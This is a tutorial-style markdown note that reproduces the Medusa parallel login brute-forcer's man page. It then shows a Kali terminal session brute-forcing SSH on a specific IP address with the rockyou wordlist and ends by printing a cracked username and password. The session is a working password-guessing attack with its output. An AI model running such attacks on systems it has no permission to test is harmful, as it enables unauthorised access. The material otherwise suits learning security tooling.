# Medusa


* NAME
       MEDUSA - Parallel Network Login Auditor

* SYNOPSIS
       
       medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPTIONS]

* DESCRIPTION
       Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer.  The goal is to support as many
       services which allow remote authentication as possible. The author considers following items to  some  of  the  key
       features of this application:

       
       -h [TARGET]
              Target hostname or IP address.

       -H [FILE]
              Reads target specifications from the file specified rather than from the command line.  The file should con‐
              tain a list separated by newlines.

       -u [TARGET]
              Target username.

       -U [FILE]
              Reads target usernames from the file specified rather than from the command line.  The file should contain a
              list separated by newlines.

       -p [TARGET]
              Target password.

       -P [FILE]
              Reads target passwords from the file specified rather than from the command line.  The file should contain a
              list separated by newlines.

       -C [FILE]
              File containing combo entries. Combo files are colon separated and in the following format:  host:user:pass‐
              word.  If  any of the three fields are left empty, the respective information should be provided either as a
              single global value or as a list in a file.

       -O [FILE]
              File  to  append  log information to. Medusa will log all accounts credentials found to be valid or cause an
              unknown error. It will also log the start and stop times of an audit, along with the calling parameters.

       -e [n/s/ns]
              Additional password checks ([n] No Password, [s] Password = Username). If both options are being used,  they
              should be specified together ("-e ns"). If only a single option is being called use either "-e n" or "-e s".

       -M [TEXT]
              Name of the module to execute (without the .mod extension).

       -m [TEXT]
              Parameter  to pass to the module. This can be passed multiple times with a different parameter each time and
              they will all be sent to the module (i.e.  -m Param1 -m Param2, etc.)

       -d     Dump all known modules.

       -n [NUM]
              Use for non-default TCP port number.

       -s     Enable SSL.

       -g [NUM]
              Give up after trying to connect for NUM seconds (default 3).

       -r [NUM]
              Sleep NUM seconds between retry attempts (default 3).

       -R [NUM]
              Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.

       -c [NUM]
              Set the number of usec that are waited during a test of the established network socket. Some services  (e.g.
              FTP,  IMAP,  POP3, and SMTP) may be configured to drop connections after an arbitrary number of failed logon
              attempts.

       -t [NUM]
              Total number of logins to be tested concurrently. It should be noted that roughly t x  T  threads  could  be
              running at any one time. 381 appears to be the limit on my fairly boring Gentoo Linux host.

       -T [NUM]
              Total number of hosts to be tested concurrently.

       -L     Parallelize  logins using one username per thread. The default is to process the entire username before pro‐
              ceeding.

       -f     Stop scanning host after first valid username/password found.

       -F     Stop audit after first valid username/password found on any host.

       -b     Suppress startup banner

       -q     Display module's usage information. This should be used in conjunction with the "-M"  option.  For  example,
              "medusa -M smbnt -q".

       -v [NUM]
              Verbose  level  [0  - 6 (more)]. All messages at or below the specified level will be displayed. The default
              level is 5.

              The following is the breakdown of the verbose levels: 0)   EXIT APPLICATION  1)    MESSAGE  WITHOUT  TAG  2)
              LOG MESSAGE WITHOUT TAG 3)   IMPORTANT MESSAGE 4)   ACCOUNT FOUND 5)   ACCOUNT CHECK 6)   GENERAL MESSAGE

       -w [NUM]
              Error  debug  level [0 - 10 (more)]. All messages at or below the specified level will be displayed. The de‐
              fault level is 5.

              The following is the breakdown of the error levels: 0)   FATAL  1)    ALERT  2)    CRITICAL  3)    ERROR  4)
              WARNING 5)   NOTICE 6)   INFO 7)   DEBUG 8)   DEBUG - AUDIT 9)   DEBUG - SERVER 10)  DEBUG - MODULE

       -V     Display version

       -Z [TEXT]
              Allows basic resuming of a previous scan. The supplied parameter describes which hosts were completed, which
              were partially tested and which had not been started.  When Medusa receives a SIGINT, it will calculate  and
              display  a "resume map". This map can then be supplied to the next run. For example, "medusa [OPTIONS PREVI‐
              OUSLY USED] -Z h6u1u2h8."

### example attack on webserver 
```
┌──(kali㉿kali)-[~]
└─$ medusa -h 143.110.251.159 -u king -P /usr/share/wordlists/rockyou.txt -M ssh                                                                        255 ⨯
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 123456 (1 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 12345 (2 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 123456789 (3 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: password (4 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: iloveyou (5 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: princess (6 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 1234567 (7 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: rockyou (8 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: football (41 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: secret (42 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: ieee2021 (107 of 14344393 complete)
ACCOUNT FOUND: [ssh] Host: 143.110.251.159 User: king Password: ieee2021 [SUCCESS]
```

### Explanation for above attack 

*medusa -h 143.110.251.159 -u king -P /usr/share/wordlists/rockyou.txt -M ssh 
* -h => Target hostname or IP address
* -u => Target username
* -P => Target passwords from the file [wordlist]
* -M => Name of the module to execute [eg:- ssh,ftp]
